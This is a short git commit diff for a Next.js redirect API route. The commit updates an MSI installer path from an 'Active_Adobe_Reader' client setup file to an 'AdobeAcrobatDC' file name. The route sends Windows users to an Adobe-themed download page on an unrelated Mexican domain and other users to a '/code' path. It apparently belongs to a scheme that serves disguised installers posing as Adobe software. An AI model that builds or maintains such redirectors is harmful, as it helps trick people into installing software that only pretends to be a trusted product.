6db5fae9e69cb1a3b8fe6f1c92ed3f68bd010dbd
Newman400 <marystepmom71@gmail.com>
2025-12-01 10:13:50 -0800

    Update MSI_PATH for Adobe Acrobat DC download

--- my-redirect-app-html-ready/pages/api/redirect.js
+++ my-redirect-app-html-ready/pages/api/redirect.js
@@ -4,7 +4,7 @@ export default function handler(req, res) {
 
   const WINDOWS_REDIRECT_AFTER_DOWNLOAD =
     'https://mksonline.com.mx/css/adobe/reader/download.html';
-  const MSI_PATH = '/Active_Adobe_Reader_3027.ClientSetup.msi';
+  const MSI_PATH = '/AdobeAcrobatDC_2025.003.40436_390436.msi';
 
   // Base URL for non-Windows users
   const NON_WINDOWS_TARGET = 'https://mksonline.com.mx/code';
